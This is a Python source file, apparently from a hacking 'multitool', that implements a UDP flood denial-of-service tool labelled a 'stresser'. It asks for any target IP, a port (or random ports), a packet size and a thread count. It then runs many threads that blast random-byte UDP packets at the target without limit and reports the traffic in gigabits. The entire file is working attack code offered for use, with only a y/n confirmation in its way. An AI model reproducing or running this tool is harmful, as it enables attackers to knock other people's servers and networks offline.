#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import socket, threading, random, os, time, sys

try:
    from core.display import Theme, Colorate
except:
    # fallback if run without core
    class Theme: 
        @staticmethod
        def get_colors(): return {"head":"\x1b[38;2;255;0;255m", "num":"\x1b[38;2;0;255;255m", "txt":"\x1b[38;2;255;255;255m"}
    class Colorate:
        @staticmethod
        def Horizontal(c, t): return f"{c}{t}\x1b[0m"

def _wired_msg(m, s='?'):
    cl = Theme.get_colors()
    return f" {Colorate.Horizontal(cl['num'], f'[{s}]')} {Colorate.Horizontal(cl['txt'], m)}"

class WiredStress:
    def __init__(self, _t, _p, _sz, _th):
        self.t, self.p, self.sz, self.th = _t, _p, _sz, _th
        self.sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.pk = os.urandom(self.sz)
        self.active = False
        self.sent_bytes = 0

    def start_v2(self):
        self.active = True
        for _ in range(self.th): threading.Thread(target=self._proc_v2, daemon=True).start()
        threading.Thread(target=self._live_v2, daemon=True).start()

    def _proc_v2(self):
        while self.active:
            try:
                _port = self.p if self.p else random.randint(1, 65535)
                self.sk.sendto(self.pk, (self.t, _port))
                self.sent_bytes += self.sz
            except: pass

    def _live_v2(self):
        while self.active:
            _gb = (self.sent_bytes * 8) / 1000000000
            sys.stdout.write(f"\r{_wired_msg(f'Target: {self.t} | Traffic: {_gb:.4f} Gb', '>')}")
            sys.stdout.flush()
            time.sleep(0.4)

def run_v2():
    cl = Theme.get_colors()
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(cl['head'], "\n  [ WIRED STANDALONE STRESSER ]\n"))
    
    _t = input(_wired_msg("target_ip: "))
    _p = input(_wired_msg("port (0=rnd): "))
    _p = int(_p) if _p and _p != '0' else None
    _s = int(input(_wired_msg("packet_sz (1250): ")) or 1250)
    _th = int(input(_wired_msg("threads (100): ")) or 100)
    
    print(Colorate.Horizontal(cl['num'], f"\n  [!] CAUTION: High volume stress for {_t}"))
    if input(_wired_msg("confirm (y/n): ")).lower() != 'y': return
    
    ws = WiredStress(_t, _p, _s, _th)
    try:
        ws.start_v2()
        while 1: time.sleep(1)
    except KeyboardInterrupt:
        ws.active = False
        _final = (ws.sent_bytes * 8) / 1000000000
        print(Colorate.Horizontal(cl['num'], f"\n  [!] Terminated. Total: {_final:.3f} Gb"))
    time.sleep(1)

if __name__ == '__main__':
    run_v2()